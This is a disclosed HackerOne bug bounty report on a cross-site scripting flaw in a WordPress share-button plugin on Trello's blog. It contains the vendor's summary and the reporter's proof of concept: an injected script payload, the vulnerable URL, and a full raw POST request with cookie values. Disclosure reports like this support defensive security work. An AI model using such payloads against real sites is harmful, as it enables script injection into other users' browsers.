@@ -1,0 +1,43 @@
+ReportLink:https://hackerone.com/reports/130265
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/kalihat007
+ReportedTo:Trello(trello)
+BountyAmount:128.0
+Severity:
+State:Closed
+DateOfDisclosure:14.04.2016 15:11:30
+
+Summary:
+This issue, an XSS vulnerability caused by a WordPress module ([Easy Social Share Button](https://wordpress.org/plugins/easy-social-share-buttons/)) could have affected users running browsers without any XSS filtering (e.g. Firefox)
+
+The issue had been previously reported to us and resolved (by manually patching the module), but the patch was recently reverted when changing to a different version of the module.
+
+While issues with blog.trello.com are often not in scope for our program, and this would not have directly compromised user data, we did (re-)resolve this issue and chose to award a bounty.
+This is a cross site scripting vulnerability issue  found in POST based method 
+
+payload : post method service is set to be "><script>alert(1)</script>
+
+vulenrable url : http://blog.trello.com/wp-admin/admin-ajax.php?action=essb_self_postcount&nonce=4ae59c16bc&post_id=2460&service="><script>alert(1)</script>
+
+Change this get request to post request 
+
+POC : 
+
+Request : 
+
+POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: blog.trello.com
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: _ga=GA1.2.1807904149.1460525273; _sp_id.dc4d=f30cdab74edfbf38.1460525273.3.1460534756.1460532440; _sp_ses.dc4d=*
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 104
+
+action=essb_self_postcount&nonce=4ae59c16bc&post_id=2460&service="><script>alert(1)</script>  
+
+Screenshot : enclosed 
+
+I hope this will be fix very soon 
